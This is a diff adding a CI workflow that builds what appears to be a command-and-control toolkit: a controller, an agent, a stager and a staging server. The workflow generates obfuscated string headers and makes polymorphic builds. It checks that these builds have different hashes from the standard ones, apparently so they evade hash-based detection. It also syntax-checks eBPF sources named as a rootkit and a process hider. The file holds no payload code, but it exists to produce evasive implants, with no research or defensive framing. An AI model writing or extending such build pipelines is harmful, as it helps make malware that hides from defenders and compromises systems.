@@ -1,0 +1,100 @@
+name: Build Test
+
+on:
+  push:
+    branches: [ "stable", "dev" ]
+  pull_request:
+    branches: [ "stable", "dev" ]
+
+jobs:
+  build:
+    name: Build Test (Ubuntu)
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y \
+            gcc clang gcc-multilib \
+            libsodium-dev libenet-dev libreadline-dev \
+            python3
+
+      - name: Python syntax check (tools)
+        run: |
+          for f in tools/*.py; do
+            python3 -m py_compile "$f" && echo "[ok] $f" || exit 1
+          done
+
+      - name: Generate headers (IOCs + strings)
+        run: |
+          python3 tools/gen_agent_str.py config/obf_agent_msgs.txt src/obf_agent_strings.h
+          python3 tools/gen_agent_iocs.py src/obf_agent_iocs.h
+          python3 tools/gen_obf.py config/obf_config.txt src/obf_strings.h
+
+      - name: Build all components (standard, CI_NO_BPF)
+        run: |
+          FLAGS="-Wall -Wextra -O2 -std=gnu11 -Isrc -DBUILD_EXPIRE=0UL -DCI_NO_BPF"
+          gcc $FLAGS -rdynamic -o ctrl      src/ctrl.c      -lenet -lsodium -lm -ldl -lreadline
+          gcc $FLAGS           -o agent     src/agent.c     -lenet -lsodium -lm -ldl
+          gcc $FLAGS           -o stager    src/stager.c    -lsodium
+          gcc $FLAGS           -o stage_srv src/stage_srv.c -lsodium
+          echo "[ok] ctrl stager stage_srv agent"
+          sha256sum ctrl agent stager stage_srv
+
+      - name: Test polymorphic header generation
+        run: |
+          python3 tools/gen_poly_cfg.py   src/poly_cfg.h
+          python3 tools/gen_poly_stubs.py src/poly_stubs.h
+          grep -q "POLY_CALL_CHAIN" src/poly_stubs.h && echo "[ok] POLY_CALL_CHAIN present" || exit 1
+          grep -q "POLY_LIVE_ALL"   src/poly_stubs.h && echo "[ok] POLY_LIVE_ALL present"   || exit 1
+
+      - name: Build all components (polymorphic flags)
+        run: |
+          SEED=$(python3 -c "import os; print(int.from_bytes(os.urandom(4),'little')&0x7FFFFFFF)")
+          POLY="-DUSE_POLY_CFG -frandom-seed=${SEED} -fstack-reuse=none -falign-functions=8"
+          FLAGS="-Wall -Wextra -O2 -std=gnu11 -Isrc -DBUILD_EXPIRE=0UL -DCI_NO_BPF"
+          gcc $FLAGS $POLY -rdynamic -o ctrl_poly      src/ctrl.c      -lenet -lsodium -lm -ldl -lreadline
+          gcc $FLAGS $POLY           -o agent_poly     src/agent.c     -lenet -lsodium -lm -ldl
+          gcc $FLAGS $POLY           -o stager_poly    src/stager.c    -lsodium
+          gcc $FLAGS $POLY           -o stage_srv_poly src/stage_srv.c -lsodium
+          echo "[ok] all poly builds  seed=${SEED}"
+          sha256sum ctrl_poly agent_poly stager_poly stage_srv_poly
+
+      - name: Verify poly builds differ from standard
+        run: |
+          # stage_srv carries no poly macros (USE_POLY_CFG / POLY_LIVE_ALL) — excluded
+          for bin in ctrl agent stager; do
+            s=$(sha256sum ${bin}      | cut -d' ' -f1)
+            p=$(sha256sum ${bin}_poly | cut -d' ' -f1)
+            if [ "$s" = "$p" ]; then
+              echo "[FAIL] ${bin} and ${bin}_poly have identical sha256 — poly flags had no effect" && exit 1
+            fi
+            echo "[ok] ${bin}: standard ≠ poly  (${s:0:12}… ≠ ${p:0:12}…)"
+          done
+          echo "[ok] stage_srv_poly compiled (no poly macros, byte-identical is expected)"
+
+      - name: Verify generated headers
+        run: |
+          [ -f src/obf_agent_strings.h ] && echo "[ok] obf_agent_strings.h" || exit 1
+          [ -f src/obf_agent_iocs.h ]    && echo "[ok] obf_agent_iocs.h"    || exit 1
+          [ -f src/poly_cfg.h ]          && echo "[ok] poly_cfg.h"          || exit 1
+          [ -f src/poly_stubs.h ]        && echo "[ok] poly_stubs.h"        || exit 1
+
+      - name: Verify binaries
+        run: |
+          for bin in ctrl agent stager stage_srv ctrl_poly agent_poly stager_poly stage_srv_poly; do
+            file ${bin} && size ${bin}
+          done
+
+      - name: BPF syntax check (clang)
+        run: |
+          # -I/usr/include/x86_64-linux-gnu must come first so asm/types.h resolves
+          # to the arch-specific path rather than the missing generic /usr/include/asm
+          BPF_INC="-I/usr/include/x86_64-linux-gnu -I/usr/include"
+          BPF_FLAGS="-O2 -target bpf -D__TARGET_ARCH_x86 -Wno-macro-redefined -fsyntax-only"
+          clang $BPF_FLAGS $BPF_INC src/bpf_rootkit.bpf.c && echo "[ok] bpf_rootkit.bpf.c"
+          clang $BPF_FLAGS $BPF_INC src/hide_proc.bpf.c   && echo "[ok] hide_proc.bpf.c"
